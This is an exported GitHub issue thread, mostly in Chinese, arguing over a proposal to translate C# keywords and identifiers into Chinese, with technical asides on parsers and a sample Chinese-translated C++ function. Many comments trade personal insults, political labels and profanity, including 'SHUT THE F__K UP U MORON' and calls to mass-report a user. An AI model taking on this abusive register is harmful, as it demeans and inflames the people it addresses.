“编程就是表达想法,那么用母语表达,无疑会更加高效和准确”，这个‘无疑’用得好，因为没有依据。

> 这些账号，如果是中国人或使用汉语的人，100%是逆向种族主义者，他/她们瞧不起中文字符，瞧不起自己的文化，可能是跪久了，已经站不起来了。不过是一些没骨气的软蛋罢了。已经习惯于依附于别人，软弱无能的弱者思维罢了。
> 如果不是中国人或国籍非中国这个国家的人，那么，有很大可能是种族歧视者。
> 因此，这些账号的观点不足为据。也可以看出，他们的观点没有多少建设性。只有贬低、鄙夷、傲慢与偏见。

“这些账号，如果是中国人或使用汉语的人，100%是逆向种族主义者” 又开始乱打标签。
“他/她们瞧不起中文字符，瞧不起自己的文化，可能是跪久了，已经站不起来了” 滑坡谬误。
“如果不是中国人或国籍非中国这个国家的人，那么，有很大可能是种族歧视者” 又是乱打标签，这段话里第二个标签了。
“因此，这些账号的观点不足为据” 建立在谬误和自己臆想的标签上，而且就算前面的话成立，这个“因此”也来的一点都不自然。
“也可以看出，他们的观点没有多少建设性。只有贬低、鄙夷、傲慢与偏见” 抱歉，我看不出来，或许您是受害妄想有些发作吧？

从这里开始，讨论才开始变成攻击。您说他们先攻击您的，这个我完全不赞同。

> 身在中国的我和与我有一样对中文编程热心的开发者，我们建立了即时聊天的群来研究，我们可以做出实现，如果官方的开发团队能告诉我怎么转换【标示符-Identifier】 【标记-token】 ，在哪些文件和哪一行修改，我会很感谢你的热心帮助

语言和逻辑上没有大问题，但是表现出了你的水平是无法达到完成这个目的的。

> 不好意思，指责和建议我是分开了的。
> 
> 指责归指责。建议归建议。有些跳梁小丑自己认识不到自己是小丑，他们没有自知之明，所以我善意提醒他们一下，当然，提醒完了就不想再鸟那些垃圾了。这里专注于C#前端的中文化。

把和自己不和的意见打上标签，然后说是垃圾，这就是你的讨论吗？而且对于您之前毫无逻辑的论证，我觉得您更适合没有自知之明的那个。

> 不要理会唱衰和反对中文编程的人,中文编程很有必要.编程发展到现在已经走到了一定的困境和局限,因为编程为西方文化掌握,现在需要突破.或横向或纵向

又是没有论据的一句话，我不知道你这个“因为”是怎么得出的。

> 傻狗一条，我都懒得回复你，既然像你这样的垃圾很多，我就明确表明对你们这类垃圾的厌恶好了。
我也没求你，你放心的走吧，我发在这里只是倡议和吐露一些建议和想法罢了，如果能讨论出解决方案>（当然是和国外开发者探讨）自然是最好，如果讨论不出解决方案，也仅当是一次对中文编程探索的沟通经验。
> 你说的这些问题是刁难心态而不是解决心态，在国内讨论中文编程的论坛博客和即时聊天群中已经有太多次展现了，我不屑回答你的幼稚问题。你还指着他人小学生？你的语言风格就很像小学生，遂，我也用小学生的风格回复你好了，这是对你的尊重，有点自知之明吧。

“刁难问题”只是您答不上来的问题吧？“不屑回答”只是不会吧？你也知道自己是小学生风格吗？

> 各位国外开发者朋友，你们好。
> 看来某些中国国内的洋奴已经按耐不住他们的奴性了，他们开始攻击我了，不过我也回了他们，

> 因此，可能不能继续讨论C# 的 【标示符-Identifier】 【标记-token】 【库-library】 的中文化实现了，所以请社区管理员关闭这个问题吧，谢谢。这是一次进取和探索的尝试，但以一些已经取得编程优势的既得利益者的顽固阻挠而失败。（其实原因还包括中国国内的信息封锁导致无法访问github或访问不稳定等原因使交流沟通受阻）

攻击别人不让回击，然后再扣一个洋奴的帽子。
“这是一次进取和探索的尝试” 自我感觉良好。
“但以一些已经取得编程优势的既得利益者的顽固阻挠而失败” 是你的知识水平不够，无法回答所以想跑路吧？

> 我说过，没求你们呀，你们怎么还像疯狗一样追着我咬并自以为是地认为我在求你们呀？

题目里大大的祈使句忘了吗？

> 然而，我并没有打击有反对意见其他开发者，你可以明鉴（从头看回复记录），当然，如果你与他们一样的阵营，那算我没说好了。
> 
> 关于你说的-【设想】，前面已经有，我有过表达，不知你看过没有。我已经表达过很多次，我是在学习 学习 学习，此倡议是为探讨和讨论的范畴。

我已经看完了，然后问题都指出了，你还想说自己没有打击吗？

> 请你仔细观察（从第一条回复开始），我一开始对于他们对我的嘲讽、歧视、 甚至侮辱都没在意，但是他们得寸进尺，那我只能以其人之道还治其人之身。“逆向种族主义者”这是在综合了他们的行为以后得出的结论，并不是一开始就这样。请你搞清楚先后顺序，不要认为是我开的坏头。
> 
> 你提的这三点问题，我认为是站在他们已经攻击过我之后的结论这个基础上，并不是以友善的态度探讨中文编程的可能性和可行性的延续讨论。
> 
> 嗯，通过观察你紧接着的这一条回复，可以断定你是他们一伙的，既然如此，就此打住，没意义回复你们。你不需要洗白他们的行径，洗了也没用。

“我一开始对于他们对我的嘲讽、歧视、 甚至侮辱都没在意”
我不认为那些是""嘲讽、歧视、 甚至侮辱""，只是对你这些充满谬误的话的正确回应而已，而且他们的态度我认为已经很好了。
“你提的这三点问题，我认为是站在他们已经攻击过我之后的结论这个基础上，并不是以友善的态度探讨中文编程的可能性和可行性的延续讨论” 什么态度和这三个问题有关系吗？只是自己无法回答吧。
“嗯，通过观察你紧接着的这一条回复，可以断定你是他们一伙的”，那“一伙”指代的什么呢？只要是反对您的就是一伙吗？或许您有一些被害妄想，我只是在我自己认为中立的角度来评价。

> 行啦，你不用洗了，看你持续不断地否定，你还说你自己是中立立场，你知道我是什么立场吗？
我说过，你随意解读。看你说话客气，所以回复你罢了。

您是用自己充满谬误的逻辑在论证一些事情，我反对这些谬误逻辑而已。
"
2375	我看出来的您的问题我已经都指出来了，您能不能把那些没有依据的论据加上依据（论文，统计数据），把谬误修改，顺便删掉你的挑衅和辱骂，还有打的标签呢？
2376	@qwas982 Start from compiler knowledge you should. Since you only want to build a token replacer, you don't need to dig that deep. When you try to build something real that apart from C# itself to become more like Chinese-grammar, more works and researches will follow. That will spend a lot of time and energy, have fun and don't waste your time in here.
2377	我也在弄汉语编程  不过你打这么多字 我真的没有耐心看下去 我只是想说  汉语编程与英语编程仅仅是字符串的区别 没必要 弄什么自然语言 什么民族主义！它仅仅就是字符串的区别 便于一些不懂英语的人快速记忆 理解里面表达的逻辑 最主要的还是汉化帮助文档!
2378	@fyyxgame 微软的文档中文化弄得是非常好了
2379	"@fyyxgame 
你被他们带歪了。我没表达过“民族主义”，这是他们自动加的。自然语言是形容词，不是实现真的自然语言。具体是指中文词汇。"
2380	"
直接动手去做


![jietu](https://user-images.githubusercontent.com/32810154/31582825-6f93cac2-b1c0-11e7-9cdf-9b0778bbceab.png)
"
2381	"@fyyxgame
是自己动做啊，我什么时候表达过不自己动手做的意思了吗？没有吧。发在这里是倡议，已经说过很多遍了。"
2382	@qwas982 建议您先修改那些逻辑错误，无依据的论据以及事实错误，不然您说的这些真的很苍白无力
2383	粗略的 看了一下 单纯的翻译关键字 没啥意思的!
2384	@qwas982 如果你想开发的“中文 C#”仅仅是翻译关键字，那是一件很简单的事情，完全没有必要在这里讨论这么多。您只需要修改词法分析的部分，语法和语义的部分完全不用管
2385	@Glavo  我暂时没 有弄什么 中文c#的想法 我只是自己设计一个脚本语言 其实就是翻译的 自己设计的语法和环境 
2386	@fyyxgame 我最近也在设计语言，语法分析器打算用 ANTLR 生成。不过这里说这些有些偏题了
2387	@Glavo 我不懂   我是直接用易语言做的！什么cpp c# java js 我都不懂
2388	@fyyxgame 不用生成器的话，手糊一个递归下降的语法分析器其实也挺简单的，不过修改起语法也比较麻烦，而且错误处理也不太好做，但是用来练习编译原理也是不错的
2389	@Glavo 貌似 我都做到了语法 解析  换行语法排错  快捷输入 提示  断点调试 编译等..
2390	"@Glavo 
![duandiantiaoshi](https://user-images.githubusercontent.com/32810154/31582964-09829a2a-b1c4-11e7-96cf-c0d96f2fda79.png)
"
2391	火钳刘明
2392	@fyyxgame 换行的逻辑你是怎么做的，单纯的每行结尾插分隔符吗？我挺头疼这玩意的，想用些优雅的方式解决，之前我的方式都挺丑的……
2393	@zhusaidong 他以为易语言很久没维护了，实际上他连官网都没看一下……
2394	@fyyxgame 我是想做的和Scala一样，还要根据语法的上下文来判断语句是否结束。譬如小括号内语句不会结束，如果下一行开头是操作符语句也不会结束……  
2395	"@Glavo  首先要知道语言中 确定声明了哪些变量参数 什么可以调用 不可以调用 然后来模拟 计算这个表达式 来检查出错误 这个gif只是 说不完整表达式 而已 
![huanhangpaicuo](https://user-images.githubusercontent.com/32810154/31583036-6f0d9ede-b1c5-11e7-8797-2e7f320d653b.gif)
"
2396	"@Glavo 
我是想做的和Scala一样，还要根据语法的上下文来判断语句是否结束。譬如小括号内语句不会结束，如果下一行开头是操作符语句也不会结束……
--
模拟计算一下就知道了

"
2397	@fyyxgame 你的这个语言如果在‘+’前面或后面换行还能正确解析吗？
2398	其实手写描述换行逻辑还算简单，但是想用 bnf 严格的表述出来就挺恶心了。我是看不下去自己的语法树里还塞着一堆换行符
2399	@Glavo 我明白你是什么意思了  你是说  一行代码多行写 是吧!  那你需要分号   无视换行就可以了 直到遇到分号 cpp java 不就是么？  js里面如果有分号可以把所有代码都写一行 
2400	@fyyxgame 这个 issue 下不适合聊这些。你用QQ吗？用的话可以在QQ上聊这个。
2401	微软能把c#在线文档都支持中文化就可以了。微软的技术文档也做的很不错的，至少开发中碰到的99%的问题，都可以用它的在线文档找到答案。
2402	"please ignore this issue.
In China, the questioner, this Guys is a Joke, a typical fool !!!"
2403	我在小学自学了c语言，初中自学了c++和c#，现在高中正在自学操作系统原理。请勿义务教育的英语不够用吗？另外，我小学和初中都是英语刚过及格线。
2404	@Oyami-Srk  真厉害 我上到初中就辍学了
2405	"作为一个口口声声说要用中文编程的人居然连中文标点都不会用，可以说是很爆笑了。

A guy who wants to program in Chinese cannot use Chinese punctuation correctly... lol"
2406	@nameoverflow  看得懂就行  就不用 就不用 就不用
2407	"@qwas982 先把自己 visual studio 订阅/Windows订阅/Office 订阅什么的放出来以彰显自己是 MicroSoft 死忠粉
不然，别人凭啥给你做啊
真当全世界都进入共产主义社会
实现地球的伟大复兴了啊"
2408	@qwas982 你可以看看这个 http://bbs.csdn.net/topics/380159364 也几乎能实现你的要求
2409	"@qwas982 
民科之所以为民科，在于其向往科学家的社会地位，以及众人对于博学者、学术权威的拥戴，同时又不愿花功夫钻研问题、学习知识、磨练技能。鉴于民科对“名”的贪恋大于“利”，大家基本也就是批评笑话两句，多数人也不置可否。

而另有一类人，其特点为“嘴上全是主义”，姑且称其为“民间革命家”（贬义，区别于真正的革命家）。
这种人通常可以分为两类，一类是商业投机者，最终目标是赚钱；另一类则是政治投机者，最终目标是成为社会活动家，名利双收。之前的易语言已经闹过“是中国人就用中文编程”的笑话了，你要讲笑话，至少应该换个笑点吧？

这两类人，都是没工夫写代码，也没有耐心学完一门《编译原理》课程的。

看看你自己的Github主页，一行像样的代码都没有，在这儿指点江山，不觉得惭愧吗？

这儿是技术社区，不适合作革命根据地，建议你转战mp.weixin.qq.com或者weibo.com。"
2410	"
![1a4951f5a526f78d0bb4a9555ef93609_256_256](https://user-images.githubusercontent.com/10029658/31585021-8b36ecc4-b1ec-11e7-99b0-32de94b56d64.png)
I can't believe I've read all the comments...



"
2411	国人的脸都被你丢尽了
2412	@luodaoyi  怎么丢人了？我觉得没什么啊!有想法就是好的！
2413	"然而编程中文英文从来都不是障碍。c#关键字总共也没两个单词。这点单词都背不下来还是别写程序了。
再不济对中文有执念，不如自己搞一个中文编程语言。不过等你造出来就会发现中文英文并没有什么区别。"
2414	"@qwas982 
为什么世界上没有一门像样的中文编程语言呢?这是一个历史问题.计算机刚刚出现的时候,主导的研究人员和开发者都是美国人,所以现在计算机相关的东西基本上都是英文.这么做,一方面是为了保持与已有系统良好的兼容性,也是因为英语是世界上使用最广的语言,这样做可能也是最好的决策.这个历史问题也反映了我们中国在计算机方面的落后.我理解你想要一门中文编程语言的想法,但是,你让外国人给一个外国人创造的C#加入良好的中文支持,这就是没有可能的.他们用英文创造C#无可厚非,他们不支持中文也没有做错任何事.如果你真的要一个中文编程语言,请不要请求外国人做这件事.你可以自己开创一个中文专用的编程语言,我相信就算这可能是一个幼稚的决定,也一定会有很多国人来帮你的.但是如果你并不认为自己有创造编程语言的本领,那就先去苦练自己的本领吧.中国的崛起要的是真正的实干精神,计算机是一个靠实力说话的领域.美国他们占据绝对的优势,中国人还没有绝对的话语权,那我们就更不能只在这里互相掐架.爱国之心人人都有,实现方式却不尽相同.希望你可以自己关闭这个issue,结束这一场荒唐的讨论.干点真正的实事."
2415	这么喜欢翻译，就去当翻译好啦。多翻译几本国外的经典书籍，比在这被这么多大佬喷，来的实在。不是么。
2416	"看了大部分在这里回复的都是中国的程序员. 按理说程序员的智商都不低. 中文编程提的人不少 反对的人更. 
反对的理由各式各样. 动手做的人不多 , 他不做咱们自己做 [地址](https://gitee.com/HTWX/CHTypeScript)

![temp3](https://user-images.githubusercontent.com/6562192/31586369-69e4b9d2-b202-11e7-8cf3-b88e18b357fd.gif)
![temp3](https://user-images.githubusercontent.com/6562192/31586559-2d7da190-b205-11e7-88bc-64bc6d20edd4.gif)
![temp3](https://user-images.githubusercontent.com/6562192/31586591-9d9b676e-b205-11e7-951b-acfd847ead90.gif)

![2345](https://user-images.githubusercontent.com/6562192/31585966-1269795e-b1fd-11e7-87a9-7cc9c9a65f38.jpg)

![temp3](https://user-images.githubusercontent.com/6562192/31585927-8a53a8c8-b1fc-11e7-9577-3b330479245a.gif)
![45678](https://user-images.githubusercontent.com/6562192/31586062-73a3124c-b1fe-11e7-899c-bcd84bdb65f7.jpg)
"
2417	"当然抱歉我在这里谈一点别的东西
这个issue可能 _应该close掉了吧_
@fyyxgame 
__同辍学...__ 淌过义务教育的坑了, 上一个月高中, 发现这样下去没有意义, 现在继续研究杂一点的东西. 不限于程序设计. 刚从Telegram看过来.
@Oyami-Srk 
我是小学沉迷 _Flash游戏_ 无法自拔
还是`小学. 4, 5级`我遇到了大数字的急救盘, 入 __GNU/Linux__
毕业之前就在 __百度Linux吧__ 混着.
后来 __初1, 2依然混Linux吧__(所以在我眼中良心是比技术更重要的事)
初三暑假前最后一个星期三我在[酷安](https://coolapk.com)认识了许多同龄大佬 ~~如今又在这里看到了一大堆真正的dalao~~ 好不容易开发出了一款叫MinBase64的应用.
现在在打杂, 其实也就是基本啥都学, 啥都研究. 包括但不限于 `系统管理, PL方面研究(如BeanShell, JVM, Scheme, luajit), 多媒体处理, 操作系统/PL底层研究, 逆向工程, 安全, 开源硬件`, ,, 🙈
这几天正在参加[GeekApk项目](https://geekapk.com)的后端API(或许还有实现)设计, 算是学习一下后端知识吧. ~~虽然由于学习的侵蚀基础严重不稳, 需要再看文档代码~~
@qwas982 
你这个就比较 __民科__ 了...
__说话小学生, 技术上知之甚少, 开始连翻译都没想到(你应该考虑看issue的人什么母语). 知己不知彼, 怎么成事呢?__
说实在话. 如果本地化, 为了适应中文语法而添加 __奇怪__ 的表达方式, 那parser多难写, 并且会 __大大增加标识/操作符的复杂程度__ 要不然, 如果像你那样翻译还更别扭. 如果用你的母语表达很别扭的话... 还不如不用
如果你坚信可以靠你说的""语法糖""来使 __编程""娱乐化, 大众化""__ 的话...
我的建议是你 __建立一门翻译性语言, 名字就上面建议的那个吧, 叫 Chinese#__.
写个parser, 再把解析出的语法树简单的直接翻译为 C# 多好. 编辑器插件也行.
#### 不过我是不认为这有什么前途的... 就这个轮子走吧, 英文语法更适应这个东西, 而且现在满世界都是这样的东西了. 👎 "
2418	"https://github.com/klumsy/DayBreak-ChinesePowerShell
这个外国朋友翻译的破晓，估计你也看不上吧，“小玩意……”。
嗯，要做大事的人"
2419	http://bbs.csdn.net/topics/380159364
2420	"```c++
unsigned readFileData() {
	istream& inFile=cin;

	unsigned length=0;

	destroySendBuffer();
	
	for(int i=0;i<PACKETS_PER_BLOCK && !inFile.eof();i++) {
		char *buf=new char [SEND_BUFFER_SIZE];
		for(int i=0;i<SEND_BUFFER_SIZE;i++) buf[i]=0;
		inFile.read(buf,SEND_BUFFER_SIZE);
		length+=inFile.gcount();
		sendBuffer.push_back(buf);
	}
	return length;
}

无符号的 读取文件数据() {
	输入流& 输入文件=标准输入; //也可以叫 命令行输入

	无符号的 长度=0;

	销毁发送缓冲区();
	
	对于(整形 i=0;i<包每块 && !输入文件.文件结束();i++) {
		字符 *缓冲=新的 字符 [发送缓冲区大小];
		对于(整形 i=0;i<发送缓冲区大小;i++) 缓冲[i]=0;
		输入文件.读取(缓冲,发送缓冲区大小);
		长度+=输入文件.统计(); //谁能告诉我 gcount 方法的具体用处... 我看来是 get_count
		发送缓冲区.压回(缓冲); //push_back 是啥鬼?
	}
	返回 长度;
}
```
__然而, 实际上上面的代码别扭极了, 那么如果我们让它 ""贴合中文语法"" 会如何?__
```c++
函数 读取文件数据 返回 正整数 不需要参数.
    输入流& 输入文件 是 标准输入 //没学过CPP的语法, 不清楚这个 '&' 的 具体含义.
    正整数 长度 为 0 //不用 '为' 就不够通顺, 但这里语义又淡薄了
    销毁发送缓冲区． //像Ruby那样, 无参数的函数直接写函数名来调用, 为了区别于同名变量, 后面加个句号...
    对于 整数 i为0； 如果 i小于包每块 且不 (调用 输入文件 的 文件结束?方法) 那么 i自増 ,执行 //执行关键字/标识是为了解决悬挂问题, 然而还是**
        字符 *缓冲是(新的 对 字符 的 数组(发送缓冲区大小)) //在Rust里 '*' 是defer, C里我不知道. 即使表达过来也是更加恶心. 这个数组表达也是够parser写几k行了
        对于 整数 i为0； 如果 i小于发送缓冲区大小 那么 i自増 ,执行 (索引 缓冲的i)变为0 结束.
        用 缓冲, 发送缓冲区大小 去调用 输入文件 的 读取方法 //""去调用""即""调用""的一个别名... 调用一个方法时自动去掉名称后的""方法""
        长度等于长度加上(调用 输入文件 的 统计方法)
        用 缓冲 去调用 发送缓冲区 的 压回方法
    结束.
    返回 长度
结束函数
```
总结一下上面全是中文却又没人能看懂的""中文编程""语法
```c++
int main(int argc, char * argv) {}
//函数 main 返回 int 参数 int argc, char * argv. 结束函数

int i;
//声明 int i

int i = 0;
//int i是0

foo_func();
//调用 foo_func

```
__...哎我编不下去了. 为了贴合小白用自然语言编程的需要, 语法降级了这么多, 你看两遍还未必能懂__"
2421	170th comment here in 4 days, damn 1.3 billion is real!
2422	"GitHub supports **block and report user**.

If so many people, I mean, active users, report one user at the same time, what does that mean, we all know.

Please stop talking with a bot-like guy."
2423	呵呵
2424	"First of all, the programming languages are **NOT** in English, but ASCII strings;

Second, a keyword in a programming language is not necessarily a valid word in English (or whatever language that uses Latin Script), also the programming languages are not following the grammar of English (or whatever Indo-European language);

Third, at least you need to provide a persuasive data of the potential interest that Microsoft could benefit from creating Chinese version of those languages you required, no company is willing to do something that cannot make interest;

Last, from your comments I implied that you have absolutely no knowledge about how to design a programming language and implement it, if you really want to make your daydream happen, why don't you go read some book and close this BS issue?"
2425	@Z-Shang 居然惊动了商巨巨
2426	"@qwas982 @htwx 
回复你们给我的 ':-1:'
""中文编程"" 就是和 ""ChinaOperatingSystem"" 一样, 鼓吹的伪命题罢了. __一般的人都是自己做, 拿来当玩具玩. 因为语法太难看, 还要多敲不少键.__
我就告诉你们吧:
> 实现的少

您没有看上下文啊? __上面不少人提出了自己在开发的全中文编程语言, 需要我为您枚举吗?__
您去看看[Scratch](https://scratch.mit.edu), ArduBlocks, 哪怕是在Scratch上修改发布的九彩鱼.

@qwas982
这不是实现了您上文的看法""表达思想""吗? 😃 
Scratch完全可以作为一个小型的过程式来玩了,  __在中国, 有多少人会用它写东西?__ (当然这也和中国人以数理化为重, 其它皆为歪门邪道有关)
__Scratch 是直接的逻辑形式, 全中文的表达__
没错, 的确有些人从不会编程到能拿Scratch写游戏了.
但是比较大的项目也可以用这种 ""图形编程"" 吗? 请您自己思考.
我就不想提[百度Scratch吧](http://tieba.baidu.com/f?kw=scratch)上有人问的那些问题了, 水平真的低, 没啥好说的. 👎 

> 他不做咱们自己做 地址

抱歉刚才理解错了. 应该先把这句话说出来才好. 🐱 "
2427	"有争议是好事，欢迎各路大神前来争议，没有争议没有进步。
有反对中文编程的（也有很多人分不清，他自己到底是反对我本人 还是反对中文编程），
但是也有支持中文编程并作出实际行动的。
看来对于中文编程，汉语编程，并不是一边倒。"
2428	I do also think what this issue is talking about is nonsense. You said that it's language blocked people who want to try programming, and I think those people may not be suitable for programming, cause the very important part in a program is the algorithm or business logic, this is more difficult than the language itself. And I reviewed your suppositive Chinese CSharp, it's just a version that only translated the keywords to Chinese. Do you think these keywords hard to remember? And I can confirm that ones who cannot handle these keywords couldn't make great programs. Microsoft naturally won't support these nonsense people. I recommend closing this nonsense discussion.
2429	"@pigfromChina 
我觉得你和众多反对中文编程的人已经进入了一种 【迷信】 中文，汉语，汉字**不能**实现计算机编程这样一种误区。你和他们一样，你觉得自己会了，其它不会的人，会不会都无所谓，因为事不关己高高挂起。何不食肉糜。对吧？和开头长文表达的重点，你一个都没去了解，你只是凑热闹，依据自己一厢情愿的解读来看待此次引起的争议罢了。
还有你对代码中文化的过度丑化，汉字的过度丑化，我也不想多说什么，明眼人能看出。


///

```
无符 读文件数据() {
	进流 & 进文件=进入;

	无符 长=0;

	摧毁发送缓冲();
	
	循环(整 i=0;i<包_每_块 && !进文件.结束文件();i++) {
		字符 *缓=新 字符 [发送_缓冲_尺寸];
		循环(整 i=0;i<发送_缓冲_尺寸;i++) 缓[i]=0;
		进文件.读(缓,发送_缓冲_尺寸);
		长+=进文件.统计();
		发送缓冲.推_回(缓);
	}
	返回 长;
}

```
你改的代码这样就可以，只不过没有语法高亮罢了，高亮没有对中文字符支持，可以以后实现，但是我不知道你为何有意丑化中文字符的用法（除了傲慢与偏见、逆向种族主义，我想不到别的）。并且我也在前文中表达过，阿拉伯数字和数学符号根本无需中文化。并且也说明过理由，就是普罗大众都懂得就没必要汉化、中文化。你可能不爱中国的文化（没有强调爱国，声明下，免得又被别人一厢情愿地按照他自己的理解去解读），但不能代表所有人都不爱这个种族的文化。
并且，我也表达过，这是第一步，中文编程第一步，可能是简陋了点，但总比一些人总想着一步登天、一步到位来得强。第一步走汉化这条路必然来得实在些。首先有个简陋的基础，之后才有改进的对象，我觉得没有什么问题。"
2430	What a funny and disgusting joke.
2431	Nobody is smearing Chinese, that is your one-sided understanding, your such behavior is only losing Chinese people's face!
2432	已经习惯了用英语，如果真的用中文去写，会感觉反而不适应吧。
2433	"After reading all the comments, i have to say something ( how bored i am :(
I think what you need is a editor plugin translating Chinese tokens to English. there is no need to create a new programing language which is mostly same as the exist one.
here is a example:
you can code like that: ( i am not focus on csharp, please pardon for any typo
```cs
私有 a 为 1;
```
then the plugin will translate it automatically:
```cs
private a = 1;
```
what you need is creating a map storing Chinese tokens and English. and translate it before compiling.

logic is the most important one in programing, not the language, and you don't need to learn a lot of English for your life of coding(maybe just some words, no grammer, no speaking)
"
2434	"其实怼什么英文编码没意思。。。就跟前面有个用英语回答你的哥们一样，代码不是英语而是ascii，不是什么东西汉化了之后都好用的。只有自己写的代码和逻辑还好说，cout或者system.out这种撑死了自己重载一下。可是一用别人造好的轮子就傻眼了，难道我写个.net界面还把.net的东西都重载一遍？你们要是写个opencv，opencv也写一遍？还是再在别人的项目下面来这么一出，撒泼打滚说因为很多人不会英语所以求汉化？这工作量你掂量掂量？
我觉得相比这个，你的迫切需求应该是需要更多的中文开发文档和中文指导，呼吁更多人参与英文文档的汉化工作，只要有书、有指导、有案例，才有更多人看懂。至于英文的关键字什么的，照猫画虎敲上去的智力都没有也没必要参与这一行当了。还有这行就不是什么艺不艺术的，艺术家都是搞数媒什么的去了，这行就是搬砖工。"
2435	"编程 需要 生态
贵党 需要 群众
一个道理"
2436	"I can't believe I've read all the comments.......

Mark.. I've been here..I've been here..I've been here..I've been here..I've been here.. Yeeeeeeeeeeeeeeeeee..."
2437	"@TTTTh 

据我所知，现在除了ASCII编码还有更先进的unicode编码方式，如果是故意要拿一些老旧落后的证据来说明，中文**不能、不适合**编程，那请自便。我不需要说服他们，这是他们的自由。
是的，你的部分看法，我此中立态度。你强调的业务逻辑和库的问题，我说下我的看法，业务逻辑我将它比作【神】，字符我将它比作【形】，我认为形是神的宿主，形看得见摸得着，但神看不见摸不着，形是神的表达。所以，我觉得形也很重要，业务逻辑 名词，我接地气点，翻译下，或许叫”思想“可能更准确点，编程一样是在表达一种思想。所以，用母语字符表达，可能会更准确和高效。
再说库的问题，上面很多反对中文编程看待库的问题是站在 \已有\ 的基础上，那自然会产生很多问题，但是我表达的是 \之后\ 新创造的基础，让新学会中文编程的人去创造新的库就不会产生这些问题，新的用新的，旧的用旧的，也可以翻译旧的拿来用，没说不可以，这都是自由的，我从来没强调过必须要按照什么标准来一遍。"
2438	"@pnck 
对，生态也不可能一步到位，需要慢慢建立。"
2439	"@Kilerd 
请理解，**不要**通过**一步登天、一步到位**去实现目标，先建立个过渡带，缓冲带，这也没什么不好吧。
如果你非要一口吃成胖子，那也是你的自由，好吧，你自便。"
2440	"@htwx @fyyxgame 
我要向你们致敬，我非常尊重你们。首先谢谢你们对中文编程持赞同看法，其次，你们通过实际行动表达了你们的理解，我很钦佩。你们的截图表达很有说服力，我要表达的意思也与之相差无几。就是这样，先翻译token标记  Identifier标示符  还有很多英语词汇  我觉得就非常具有可行性。 
目前正在努力学习你们的实践过程。
"
2441	"There's a company developing Chinese-coding using C#.
http://bbs.csdn.net/topics/380159364

You can cooperate with them, and achieve your Chinese-coding dream.
I think that's what you like."
2442	"@1448839220  

如你这类观点，
说多无益，毫无建设性，你们贬低就贬低，这是你们的自由，我不干涉。"
2443	"@qwas982 ..问题是这样的..
如何创建一个编程语言?

1.语义设计
2.语法设计
3.实现一个编译器
然而C#这3个已经完备.并且已经有成熟的版本.
而您现在需要修改的您能说明白是上述3点中的哪一个么?
如果能.那您能说清楚都要改什么嘛?
如果能.那我相信您会关闭这个ISSUE...

看看跟我合影的 ""父亲"" 给予您的慈祥微笑..关掉这个ISSUE吧..别他妈丢人了!


I think the question is:How to create the programing lang?
1. semantic design
2. syntax design
3. to implement a compiler

So.Could you tell me if you want C# use Chinese.
Which one must be change and how ? 
If you can , I think you will close this issue . Thx.."
2444	you can do it by yourself.
2445	"@qwas982 

if you want one make one urself or **SHUT THE F__K UP** U MORON"
2446	"@BenLampson 

上面有人攻击我，并且表达，说汉字丑陋，中文字符丑陋，我觉得真正丢中国人，中国文化脸的人是你们这类人，你们才是真正的丑陋的中国人。

【Meowv commented 3 days ago
Chinese programming is really ugly and difficult to write. :joy::joy::joy:】

并且还有7个人支持他，那么，我认为这7个人与他有相同认知。
以上

语义，语法，后端的实现，我已经表达过很多次。
希望志同道合的兄弟组队实现。我不会学你们，自不量力，觉得自己可以一手遮天。"
2447	Don't be so serious, maybe the guy is just trying to have some fun.
2448	"@bctnry 

你滚吧，我看你点反对最频繁，你当狗最积极，算了，不与你这类人争吵了。
我觉得我没必要每个评论都回复。特别是你这种评论。can  you  fa*k  youself？"
2449	if everyone can speak Esperanto, not Chinese Programming that only for china, this issue will be so easy that we don’t need to think twice
2450	"汉语本身就自带分词,用程序的写法写出来添加了额外的空格后可读性就是变差了

汉语 本身 就 自带 分词,用 程序 的 写法 写 出来 添加 了 额外 的 空格 后 可读性 就是 变差了

你觉得第二种说法不奇怪吗?汉语写出来的程序就是这个感觉

人家说的是`Chinese programming`请问你是怎么翻译出`中文字符`和`汉字`来的? 英语水平问题?"
2451	"@Trim21 

`Chinese programming `我翻译为`中文编程`，用google翻译，也会翻译为中文编程。

`中文字符`和`汉字`
是你自己的解读"
2452	"@qwas982 
不赞同你对创造中文版C#的想法,但是赞同你对于汉字与中文部分的想法.
另外这里有一些ABC是真的看不起中文的"
2453	"@qwas982 

别啊,你的原话怎么就变成我自己的解读了

> 上面有人攻击我，并且表达，说汉字丑陋，中文字符丑陋，我觉得真正丢中国人，中国文化脸的人是你们这类人，你们才是真正的丑陋的中国人。
>
>【Meowv commented 3 days ago
Chinese programming is really ugly and difficult to write. 😂😂😂】
"
2454	我觉得如果你想搞中文编程，就搞个自然语言编程，这个更有想想空间，以后写个作文，计算机就可以执行了
2455	"@ragnaroks

多谢提醒，我还以为就我一个人认为他们是`【中国人】`呢。（打双引号）
关于创造中文版C#这个疑问，我不是求他们或微软官方开发团队，我的原意是，自己开发，或有志同道合的的兄弟一起开发。"
2456	"@fengjb
你的想法是一步到位，一步登天。"
2457	"@Trim21

这句话的意思是，他表达` 中文编程 `中的汉字丑陋，字符丑陋，进而引申到汉字文化也是丑陋的。"
2458	"你 觉得 这样 说话 不 丑陋?
你 愿意 这样 说话?"
2459	请楼主自己实现吧
2460	"@Trim21

我已经表达过很多遍，我不会想着一步到位，一步登天的，你说的这个问题（加空格），并不是一开始就应该解决的问题。你可以看我事例的代码，暂时没有这个问题"
2461	"App.DBClass.Count(String DBName=NULL)
应用的类的计数方法(字符串 数据库名默认是空)

确实中文写起来较为蛋疼,特别是严格要求不能出现西文半角的话.
不过我觉得这个还挺有意思的,全部用中文来写,对非中文母语的人来说算是自带高端混淆了."
2462	"所以 你 觉得 这样的 说话 方式 是不是 丑陋 的? 
先 请你 正面 回答 这个 问题

"
2463	"http://bbs.csdn.net/topics/380159364?page=2
已经有这样的东西了，你还想要啥？
你想拉志同道合的人，自己拉人啊，在这里搞大新闻有意思吗？
好了，停止这些无聊的争论吧。"
2464	"fun post. 
I guess made it by yourself is faster than you ask someone to made it. lol"
2465	有时间在这里说半天为何不为了开源项目翻译作出自己的贡献？[py3 doc](https://docs.python.org/3/)
2466	"Every language has its value.
But, the value of Chinese is not programming."
2467	"@qwas982 

>　我觉得你和众多反对中文编程的人已经进入了一种 【迷信】 中文，汉语，汉字不能实现计算机编程这样一种误区。

我没有说不可能实现，我的意思是现在　＂中国自主＂　已经有鼓吹的嫌疑了　．　上文已经有人提到了自己有一些＂中文编程＂的尝试了　请不要自己臆造幻想中的敌人．

